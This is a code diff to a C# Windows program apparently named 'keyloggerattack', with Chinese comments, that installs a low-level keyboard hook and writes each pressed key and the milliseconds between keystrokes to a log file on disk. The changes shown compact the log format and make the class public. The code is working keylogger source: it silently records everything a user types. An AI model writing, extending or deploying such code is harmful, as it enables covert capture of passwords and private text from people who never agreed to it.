@@ -1,5 +1,6 @@
 ﻿using System;
 using System.Windows.Forms;
+
 using System.Windows;
 using System.Text;
 using System.Linq;
@@ -14,20 +15,11 @@ using System.Reflection;
 
 namespace keyloggerattack
 {
-    class Program
+    public class Program
     {
         // 記錄檔路徑
         //在這裡自訂記錄檔的儲存位置，例如: "C:\\log.txt"，必須加上檔案名稱和附檔名。
         readonly public static string logPath = "D:\\log.txt";
-
-        private class KeyBoardHookStruct
-        {
-            public int vkCode;
-            public int scanCode;
-            public int flags;
-            public int time;
-            public int dwExtraInfo;
-        }
         // 委託 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
@@ -95,11 +87,12 @@ namespace keyloggerattack
                 TimeSpan ts = GetNowDateTimeDetail - beforeTime;
 
                 int ms = (int)ts.TotalMilliseconds;
-                string strTime = "Delay " + ms.ToString();
+                //string strTime = "Delay " + ms.ToString();
+                string strTime = ms.ToString();
                 Console.WriteLine((Keys)vkCode);
                 StreamWriter sw = new StreamWriter(logPath, true);
-                sw.WriteLine(strTime);//將時間strTime也寫入
-                sw.WriteLine("KeyUp" + " \"" + (Keys)vkCode + "\"");
+                sw.WriteLine("D" + strTime);//將時間strTime也寫入
+                //sw.WriteLine("KeyUp" + " " + (Keys)vkCode);
                 sw.Close();
                 beforeTime = DateTime.Now;
             }
@@ -122,7 +115,8 @@ namespace keyloggerattack
                         Console.WriteLine((Keys)vkCode);
                         StreamWriter sw = new StreamWriter(logPath, true);
 
-                        sw.WriteLine("KeyDown" + " \"" + (Keys)vkCode + "\"");//將時間strTime也寫入
+                        //sw.WriteLine("KeyDown" + " " + (Keys)vkCode);//將時間strTime也寫入
+                        sw.WriteLine("K"+(Keys)vkCode);
                         sw.Close();
                     }
                     else
@@ -131,12 +125,14 @@ namespace keyloggerattack
                         GetNowDateTimeDetail = DateTime.Now;
                         TimeSpan ts = GetNowDateTimeDetail- beforeTime;
                         int ms = (int)ts.TotalMilliseconds;
-                        string strTime = "Delay " + ms.ToString();
+                        //string strTime = "Delay " + ms.ToString();
+                        string strTime = ms.ToString();
                         Console.WriteLine((Keys)vkCode);
                         StreamWriter sw = new StreamWriter(logPath, true);
 
-                        sw.WriteLine(strTime);//將時間strTime也寫入
-                        sw.WriteLine("KeyDown" + " \"" + (Keys)vkCode + "\"");
+                        sw.WriteLine("I" + strTime);//將時間strTime也寫入
+                        //sw.WriteLine("KeyDown" + " " + (Keys)vkCode);
+                        sw.WriteLine("K"+(Keys)vkCode);
                         sw.Close();
                         beforeTime = DateTime.Now;
                     }
